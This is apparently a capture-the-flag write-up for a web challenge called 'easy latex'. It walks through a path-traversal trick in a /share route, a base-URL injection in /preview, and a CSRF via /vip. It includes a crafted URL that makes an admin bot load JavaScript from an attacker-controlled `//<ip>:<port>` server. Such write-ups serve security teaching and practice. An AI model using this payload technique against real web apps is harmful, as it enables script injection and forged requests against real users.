# easy latex

Key point: CSRF, XSS

* In the `/share` routing function of `web/app.js`, the `req.parms` method supports URL encoding parsing. Therefore, we can use `/share/..%2fpreview` to redirect the admin bot to access `/preview` routes.
* The `/preview` routing function of `web/app.js` uses `new URL(theme, ...)` to create a `URL` object `base`, where `theme` is a request parameter. However, this usage can lead to a vulnerability. If we set `theme` to `//<ip>:<port>`, the final url of the object will become an arbitrary remote address. At the same time, the `base` object will be used specify the source of a `js` file. Therefore, we can use the following payload to enable the admin bot to load the evil `js` file on our own server under the `/js/` path.

        /share/..%2Fpreview%3Ftex%3Dwww%26theme%3D%2F%2F<ip>%3A<port>

* Because the cookie of the admin bot is set to `httpOnly`, so we can not exploit `js` file to get the cookie. Fortunately, in the `/vip` routing function of `web/app.js`, it uses the same instantiation method as the `/preview` routing function. It is worth noting that the `username` parameter is controllable and can be constructed arbitrarily by accessing the `/login` route. Therefore, we can implement a CSRF attack through the `/vip` routing.